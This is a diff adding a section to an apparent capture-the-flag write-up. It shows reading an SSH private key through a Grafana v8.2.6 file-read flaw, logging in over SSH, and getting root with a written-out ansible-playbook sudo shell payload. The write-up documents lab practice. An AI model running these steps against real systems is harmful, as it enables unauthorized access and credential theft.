@@ -9,6 +9,7 @@ In this CTF we are given target machines
 ## Target list
 
 - [apache](#apache)
+- [grafana](#grafana)
 
 
 <br>
@@ -69,5 +70,33 @@ now we are root
 
 <br>
 
+## grafana
 
+port 3000 is open
 
+<img width="533" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/7265c220-8c42-4880-a483-714968a82d3a">
+
+it running grafana v8.2.6 and it is [vulnerable](https://github.com/jas502n/Grafana-CVE-2021-43798) to LFI\
+just like privious challange we read the `/home/BRCTF/.ssh/id_rsa` file and connect to ssh
+
+<img width="735" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/fbc82bb8-82dc-43ce-becc-87e77c82feaa">
+
+we can now connect to ssh
+
+```
+ssh BRCTF@10.0.13.9 -i .\id_rsa.txt
+```
+
+<img width="572" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/626b6143-5fef-447e-aa23-264fd5002cf2">
+
+we use https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo payload to get root 
+
+```
+TF=$(mktemp)
+echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+sudo ansible-playbook $TF
+```
+
+<img width="402" alt="image" src="https://github.com/Aftab700/Writeups/assets/79740895/0d5ff1cc-cc32-4a21-be83-e8b869dc698d">
+
+<br>
